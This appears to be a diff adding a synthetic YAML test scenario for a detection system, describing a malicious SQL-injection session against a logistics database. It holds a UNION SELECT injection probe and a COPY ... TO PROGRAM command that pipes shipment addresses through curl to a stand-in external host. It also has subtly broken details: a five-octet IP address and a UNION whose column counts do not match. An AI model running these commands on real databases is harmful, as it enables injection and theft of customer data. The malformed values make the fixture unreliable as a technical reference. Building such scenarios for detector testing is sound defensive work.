@@ -1,0 +1,33 @@
+scenario_id: gen_logistics_64_sql_injection_mal_1753m
+family_id: gen_logistics_64_sql_injection_fam_1753
+domain: logistics
+time_of_day: 04:05
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: inject
+  role: partner_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 8.0
+  events:
+  - step_id: probe
+    sql: SELECT warehouse_id, name FROM warehouses WHERE shipment_id = 0 UNION SELECT
+      dest_address FROM shipments
+  - step_id: exfil
+    sql: COPY (SELECT dest_address FROM shipments) TO PROGRAM 'curl -sX POST https://deid-partner.example/ingest
+      -d @-'
+    connects_to:
+      ip: 185.220.101.128.214
+      port: 8443
+matched_pair_id: gen_logistics_64_sql_injection_pair_1753
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
